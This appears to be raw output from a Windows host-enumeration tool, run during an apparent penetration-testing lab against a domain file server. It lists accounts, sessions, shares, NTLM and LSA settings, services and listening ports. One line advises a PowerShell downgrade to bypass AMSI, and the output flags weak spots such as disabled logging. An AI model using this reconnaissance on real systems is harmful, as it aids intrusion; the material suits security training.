+  LastLogon                      : 1/1/1970 12:00:00 AM
+  NumLogins                      : 0
+
+  ComputerName                   : localhost
+  UserName                       : Guest
+  Enabled                        : False
+  Rid                            : 501
+  UserType                       : Guest
+  Comment                        : Built-in account for guest access to the computer/domain
+  PwdLastSet                     : 1/1/1970 12:00:00 AM
+  LastLogon                      : 1/1/1970 12:00:00 AM
+  NumLogins                      : 0
+
+  ComputerName                   : localhost
+  UserName                       : WDAGUtilityAccount
+  Enabled                        : False
+  Rid                            : 504
+  UserType                       : Guest
+  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
+  PwdLastSet                     : 11/15/2018 12:04:12 AM
+  LastLogon                      : 1/1/1970 12:00:00 AM
+  NumLogins                      : 0
+
+====== LogonSessions ======
+
+Logon Sessions (via WMI)
+
+  UserName              : watamet
+  Domain                : HOLOLIVE
+  LogonId               : 250239
+  LogonType             : RemoteInteractive
+  AuthenticationPackage : Kerberos
+  StartTime             : 2/7/2023 1:36:51 AM
+  UserPrincipalName     :
+====== LSASettings ======
+
+  auditbasedirectories           : 0
+  auditbaseobjects               : 0
+  Bounds                         : 00-30-00-00-00-20-00-00
+  crashonauditfail               : 0
+  fullprivilegeauditing          : 00
+  LimitBlankPasswordUse          : 1
+  NoLmHash                       : 1
+  Security Packages              : ""
+  Notification Packages          : rassfm,scecli
+  Authentication Packages        : msv1_0
+  LsaPid                         : 740
+  LsaCfgFlagsDefault             : 0
+  SecureBoot                     : 1
+  ProductType                    : 8
+  disabledomaincreds             : 0
+  everyoneincludesanonymous      : 0
+  forceguest                     : 0
+  restrictanonymous              : 0
+  restrictanonymoussam           : 1
+====== McAfeeConfigs ======
+
+====== NamedPipes ======
+
+1100,svchost,atsvc
+1080,svchost,Ctx_WinStation_API_service
+928,svchost,epmapper
+1136,svchost,eventlog
+4264,GoogleCrashHandler,GoogleCrashServices\S-1-5-18
+4276,GoogleCrashHandler64,GoogleCrashServices\S-1-5-18-x64
+620,wininit,InitShutdown
+740,lsass,lsass
+840,svchost,LSM_API_service
+732,services,ntsvcs
+0,Unk,PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+0,Unk,PSHost.133202073870194378.3052.DefaultAppDomain.powershell
+4464,powershell,PSHost.133202074793389611.4464.DefaultAppDomain.powershell
+1744,svchost,ROUTER
+732,services,scerpc
+1100,svchost,SessEnvPublicRpc
+2200,spoolsv,spoolss
+1552,svchost,srvsvc
+1080,svchost,TermSrv_API_service
+1184,svchost,trkwks
+0,Unk,TSVCPIPE-7f55186c-9b5f-4393-b0c6-6a14153f9d0b
+1168,svchost,W32TIME_ALT
+0,Unk,Winsock2\CatalogChangeListener-26c-0
+0,Unk,Winsock2\CatalogChangeListener-2dc-0
+0,Unk,Winsock2\CatalogChangeListener-2e4-0
+0,Unk,Winsock2\CatalogChangeListener-3a0-0
+0,Unk,Winsock2\CatalogChangeListener-44c-0
+0,Unk,Winsock2\CatalogChangeListener-470-0
+0,Unk,Winsock2\CatalogChangeListener-7d8-0
+0,Unk,Winsock2\CatalogChangeListener-898-0
+532,svchost,wkssvc
+====== NetworkProfiles ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== NetworkShares ======
+
+  Name                           : ADMIN$
+  Path                           : C:\Windows
+  Description                    : Remote Admin
+  Type                           : Disk Drive Admin
+
+  Name                           : C$
+  Path                           : C:\
+  Description                    : Default share
+  Type                           : Disk Drive Admin
+
+  Name                           : IPC$
+  Path                           :
+  Description                    : Remote IPC
+  Type                           : IPC Admin
+
+  Name                           : Pictures
+  Path                           : C:\Shares\Pictures
+  Description                    :
+  Type                           : Disk Drive
+
+  Name                           : Users
+  Path                           : C:\Users
+  Description                    :
+  Type                           : Disk Drive
+
+  Name                           : Videos
+  Path                           : C:\Shares\Videos
+  Description                    :
+  Type                           : Disk Drive
+
+====== NTLMSettings ======
+
+  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)
+
+  NTLM Signing Settings
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : False
+      ServerNegotiateSigning  : True
+      LdapSigning             : 1 (Negotiate signing)
+
+  Session Security
+      NTLMMinClientSec        : 536870912 (Require128BitKey)
+      NTLMMinServerSec        : 536870912 (Require128BitKey)
+
+  NTLM Auditing and Restrictions
+      InboundRestrictions     : (Not defined)
+      OutboundRestrictions    : (Not defined)
+      InboundAuditing         : (Not defined)
+      OutboundExceptions      :
+====== OptionalFeatures ======
+
+State    Name                                               Caption
+Enabled  CoreFileServer                                     File Server Role
+Enabled  FileAndStorage-Services
+Enabled  File-Services
+Enabled  IIS-CommonHttpFeatures                             Common HTTP Features
+Enabled  IIS-DefaultDocument                                Default Document
+Enabled  IIS-DirectoryBrowsing                              Directory Browsing
+Enabled  IIS-HealthAndDiagnostics                           Health and Diagnostics
+Enabled  IIS-HttpCompressionStatic                          Static Content Compression
+Enabled  IIS-HttpErrors                                     HTTP Errors
+Enabled  IIS-HttpLogging                                    HTTP Logging
+Enabled  IIS-HttpTracing                                    Tracing
+Enabled  IIS-ManagementConsole                              IIS Management Console
+Enabled  IIS-Performance                                    Performance Features
+Enabled  IIS-RequestFiltering                               Request Filtering
+Enabled  IIS-RequestMonitor                                 Request Monitor
+Enabled  IIS-Security                                       Security
+Enabled  IIS-StaticContent                                  Static Content
+Enabled  IIS-WebServer                                      World Wide Web Services
+Enabled  IIS-WebServerManagementTools                       Web Management Tools
+Enabled  IIS-WebServerRole                                  Internet Information Services
+Enabled  Internet-Explorer-Optional-amd64                   Internet Explorer 11
+Enabled  KeyDistributionService-PSH-Cmdlets                 Key Distribution Service PowerShell Cmdlets
+Enabled  MediaPlayback                                      Media Features
+Enabled  MicrosoftWindowsPowerShell                         Windows PowerShell
+Enabled  MicrosoftWindowsPowerShellISE                      Windows PowerShell Integrated Scripting Environment
+Enabled  MicrosoftWindowsPowerShellRoot                     Windows PowerShell
+Enabled  MicrosoftWindowsPowerShellV2                       Windows PowerShell 2.0 Engine
+Enabled  Microsoft-Windows-Web-Services-for-Management-IIS-Extension Windows Remote Management (WinRM) IIS Extension
+Enabled  NetFx4                                             .NET Framework 4.7
+Enabled  NetFx4ServerFeatures                               .NET Framework 4.7 Features
+Enabled  Printing-Client                                    Windows Server Print Client
+Enabled  Printing-Client-Gui                                Windows Server Print Client Management UI
+Enabled  Printing-PrintToPDFServices-Features               Microsoft Print to PDF
+Enabled  Printing-XPSServices-Features                      Microsoft XPS Document Writer
+Enabled  RSAT                                               Root node for feature RSAT tools
+Enabled  SearchEngine-Client-Package                        Windows Search
+Enabled  Server-Core                                        Microsoft-Windows-Server-Core-Package-DisplayName
+Enabled  ServerCore-Drivers-General                         Server Core Drivers
+Enabled  ServerCore-Drivers-General-WOW64                   Server Core WOW64 Drivers
+Enabled  ServerCoreFonts-NonCritical-Fonts-BitmapFonts      Server Core non-critical fonts - (Fonts-BitmapFonts).
+Enabled  ServerCoreFonts-NonCritical-Fonts-MinConsoleFonts  Server Core non-critical fonts - (Fonts-MinConsoleFonts).
+Enabled  ServerCoreFonts-NonCritical-Fonts-Support          Server Core non-critical fonts components - (Fonts-Support).
+Enabled  ServerCoreFonts-NonCritical-Fonts-TrueType         Server Core non-critical fonts - (Font-TrueTypeFonts).
+Enabled  ServerCoreFonts-NonCritical-Fonts-UAPFonts         Server Core non-critical fonts - (Fonts-UAPFonts).
+Enabled  ServerCore-WOW64                                   Microsoft Windows ServerCore WOW64
+Enabled  Server-Drivers-General                             Server Drivers
+Enabled  Server-Drivers-Printers                            Server Printer Drivers
+Enabled  Server-Gui-Mgmt                                    Microsoft-Windows-Server-Gui-Mgmt-Package-DisplayName
+Enabled  Server-Psh-Cmdlets                                 Microsoft Windows ServerCore Foundational PowerShell Cmdlets
+Enabled  Server-Shell                                       Microsoft-Windows-Server-Shell-Package-DisplayName
+Enabled  SmbDirect                                          SMB Direct
+Enabled  Storage-Services
+Enabled  SystemDataArchiver                                 System Data Archiver
+Enabled  TlsSessionTicketKey-PSH-Cmdlets                    TLS Session Ticket Key Commands
+Enabled  Tpm-PSH-Cmdlets                                    Trusted Platform Module Service PowerShell Cmdlets
+Enabled  WCF-Services45                                     WCF Services
+Enabled  WCF-TCP-PortSharing45                              TCP Port Sharing
+Enabled  Windows-Defender                                   Windows Defender Antivirus
+Enabled  WindowsMediaPlayer                                 Windows Media Player
+Enabled  WindowsServerBackupSnapin                          Windows Server Backup SnapIn
+Enabled  Xps-Foundation-Xps-Viewer                          XPS Viewer
+====== OSInfo ======
+
+  Hostname                      :  PC-FILESRV01
+  Domain Name                   :  holo.live
+  Username                      :  HOLOLIVE\watamet
+  ProductName                   :  Windows Server 2019 Datacenter
+  EditionID                     :  ServerDatacenter
+  ReleaseId                     :  1809
+  Build                         :  17763.1577
+  BuildBranch                   :  rs5_release
+  CurrentMajorVersionNumber     :  10
+  CurrentVersion                :  6.3
+  Architecture                  :  AMD64
+  ProcessorCount                :  1
+  IsVirtualMachine              :  True
+  BootTimeUtc (approx)          :  2/7/2023 1:35:46 AM (Total uptime: 00:00:53:56)
+  HighIntegrity                 :  False
+  IsLocalAdmin                  :  False
+  CurrentTimeUtc                :  2/7/2023 2:29:42 AM (Local time: 2/7/2023 2:29:42 AM)
+  TimeZone                      :  Coordinated Universal Time
+  TimeZoneOffset                :  00:00:00
+  InputLanguage                 :  US
+  InstalledInputLanguages       :  US
+  MachineGuid                   :  90deb672-af9b-4e3e-b275-6e5f35440d1e
+====== PoweredOnEvents ======
+
+Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days
+
+Powered On Events (Time is local time)
+
+  2/7/2023 1:35:47 AM     :  startup
+  2/7/2023 1:25:06 AM     :  shutdown
+
+  2/6/2023 11:55:26 PM    :  startup
+  2/6/2023 3:30:05 PM     :  shutdown
+  2/6/2023 1:58:10 PM     :  startup
+  2/6/2023 2:20:04 AM     :  shutdown
+  2/6/2023 12:50:19 AM    :  startup
+
+  2/4/2023 1:50:04 AM     :  shutdown
+  2/4/2023 12:16:19 AM    :  startup
+
+  2/2/2023 9:55:05 PM     :  shutdown
+  2/2/2023 8:23:06 PM     :  startup
+====== PowerShell ======
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed PowerShell Versions
+      2.0
+        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
+      5.1.17763.1
+
+  Transcription Logging Settings
+      Enabled            : False
+      Invocation Logging : False
+      Log Directory      :
+
+  Module Logging Settings
+      Enabled             : False
+      Logged Module Names :
+
+  Script Block Logging Settings
+      Enabled            : False
+      Invocation Logging : False
+
+  Anti-Malware Scan Interface (AMSI)
+      OS Supports AMSI: True
+        [!] You can do a PowerShell version downgrade to bypass AMSI.
+====== Processes ======
+
+Collecting Non Microsoft Processes (via WMI)
+
+====== PSSessionSettings ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== RDPSessions ======
+
+  SessionID                     :  0
+  SessionName                   :  Services
+  UserName                      :  \
+  State                         :  Disconnected
+  HostName                      :
+  FarmName                      :
+  LastInput                     :  02h:29m:43s:260ms
+  ClientIP                      :
+  ClientHostname                :
+  ClientResolution              :
+  ClientBuild                   :  0
+  ClientHardwareId              :  0,0,0,0
+  ClientDirectory               :
+
+  SessionID                     :  1
+  SessionName                   :  Console
+  UserName                      :  \
+  State                         :  Connected
+  HostName                      :
+  FarmName                      :
+  LastInput                     :  02h:29m:43s:276ms
+  ClientIP                      :
+  ClientHostname                :
+  ClientResolution              :  640x480 @ 2 bits per pixel
+  ClientBuild                   :  0
+  ClientHardwareId              :  0,0,0,0
+  ClientDirectory               :
+
+  SessionID                     :  2
+  SessionName                   :  RDP-Tcp#1
+  UserName                      :  HOLOLIVE\watamet
+  State                         :  Active
+  HostName                      :
+  FarmName                      :
+  LastInput                     :  00h:00m:05s:875ms
+  ClientIP                      :  10.50.74.15
+  ClientHostname                :  kali
+  ClientResolution              :  1024x768 @ 4 bits per pixel
+  ClientBuild                   :  2600
+  ClientHardwareId              :  0,0,0,0
+  ClientDirectory               :  C:\WINNT\System32\mstscax.dll
+
+====== RDPsettings ======
+
+RDP Server Settings:
+  NetworkLevelAuthentication:
+  BlockClipboardRedirection:
+  BlockComPortRedirection:
+  BlockDriveRedirection:
+  BlockLptPortRedirection:
+  BlockPnPDeviceRedirection:
+  BlockPrinterRedirection:
+  AllowSmartCardRedirection:
+
+RDP Client Settings:
+  DisablePasswordSaving: True
+  RestrictedRemoteAdministration: False
+====== SCCM ======
+
+  Server                         :
+  SiteCode                       :
+  ProductVersion                 :
+  LastSuccessfulInstallParams    :
+
+====== Services ======
+
+Non Microsoft Services (via WMI)
+
+  Name                           : AmazonSSMAgent
+  DisplayName                    : Amazon SSM Agent
+  Description                    : Amazon SSM Agent
+  User                           : LocalSystem
+  State                          : Running
+  StartMode                      : Auto
+  ServiceCommand                 : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
+  BinaryPath                     : C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+  BinaryPathSDDL                 : O:SYD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     :
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    :
+  FileDescription                :
+  Version                        :
+  IsDotNet                       : False
+
+  Name                           : AWSLiteAgent
+  DisplayName                    : AWS Lite Guest Agent
+  Description                    : AWS Lite Guest Agent
+  User                           : LocalSystem
+  State                          : Running
+  StartMode                      : Auto
+  ServiceCommand                 : "C:\Program Files\Amazon\XenTools\LiteAgent.exe"
+  BinaryPath                     : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+  BinaryPathSDDL                 : O:SYD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     :
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    : Amazon Inc.
+  FileDescription                : xenagent
+  Version                        : 1.0
+  IsDotNet                       : False
+
+  Name                           : cfn-hup
+  DisplayName                    : CloudFormation cfn-hup
+  Description                    : CloudFormation cfn-hup for Windows
+  User                           : LocalSystem
+  State                          : Stopped
+  StartMode                      : Manual
+  ServiceCommand                 : "C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"
+  BinaryPath                     : C:\Program Files\Amazon\cfn-bootstrap\winhup.exe
+  BinaryPathSDDL                 : O:SYD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     :
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    :
+  FileDescription                : An EC2 bootstrapper for CloudFormation
+  Version                        : 1.4
+  IsDotNet                       : False
+
+  Name                           : GoogleChromeElevationService
+  DisplayName                    : Google Chrome Elevation Service (GoogleChromeElevationService)
+  Description                    :
+  User                           : LocalSystem
+  State                          : Stopped
+  StartMode                      : Manual
+  ServiceCommand                 : "C:\Program Files\Google\Chrome\Application\96.0.4664.110\elevation_service.exe"
+  BinaryPath                     : C:\Program Files\Google\Chrome\Application\96.0.4664.110\elevation_service.exe
+  BinaryPathSDDL                 : O:SYD:AI(A;ID;0x1200a9;;;S-1-15-3-1024-3424233489-972189580-2057154623-747635277-1604371224-316187997-3786583170-1043257646)(A;ID;0x1200a9;;;S-1-15-3-1024-2302894289-466761758-1166120688-1039016420-2430351297-4240214049-4028510897-3317428798)(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     :
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    : Google LLC
+  FileDescription                : Google Chrome
+  Version                        : 96.0.4664.110
+  IsDotNet                       : False
+
+  Name                           : gupdate
+  DisplayName                    : Google Update Service (gupdate)
+  Description                    : Keeps your Google software up to date. If this service is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Google software using it.
+  User                           : LocalSystem
+  State                          : Stopped
+  StartMode                      : Auto
+  ServiceCommand                 : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
+  BinaryPath                     : C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
+  BinaryPathSDDL                 : O:BAD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     :
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    : Google LLC
+  FileDescription                : Google Installer
+  Version                        : 1.3.36.31
+  IsDotNet                       : False
+
+  Name                           : gupdatem
+  DisplayName                    : Google Update Service (gupdatem)
+  Description                    : Keeps your Google software up to date. If this service is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Google software using it.
+  User                           : LocalSystem
+  State                          : Stopped
+  StartMode                      : Manual
+  ServiceCommand                 : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /medsvc
+  BinaryPath                     : C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
+  BinaryPathSDDL                 : O:BAD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     :
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    : Google LLC
+  FileDescription                : Google Installer
+  Version                        : 1.3.36.31
+  IsDotNet                       : False
+
+  Name                           : ssh-agent
+  DisplayName                    : OpenSSH Authentication Agent
+  Description                    : Agent to hold private keys used for public key authentication.
+  User                           : LocalSystem
+  State                          : Stopped
+  StartMode                      : Disabled
+  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe
+  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe
+  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     :
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
+  CompanyName                    :
+  FileDescription                :
+  Version                        : 7.7.2.1
+  IsDotNet                       : False
+
+====== Sysmon ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== TcpConnections ======
+
+  Local Address          Foreign Address        State      PID   Service         ProcessName
+  0.0.0.0:80             0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:135            0.0.0.0:0              LISTEN     928   RpcSs           svchost.exe
+  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:3389           0.0.0.0:0              LISTEN     1080  TermService     svchost.exe
+  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:49664          0.0.0.0:0              LISTEN     620                   wininit.exe
+  0.0.0.0:49665          0.0.0.0:0              LISTEN     1136  EventLog        svchost.exe
+  0.0.0.0:49666          0.0.0.0:0              LISTEN     1100  Schedule        svchost.exe
+  0.0.0.0:49667          0.0.0.0:0              LISTEN     740   Netlogon        lsass.exe
+  0.0.0.0:49668          0.0.0.0:0              LISTEN     2200  Spooler         spoolsv.exe
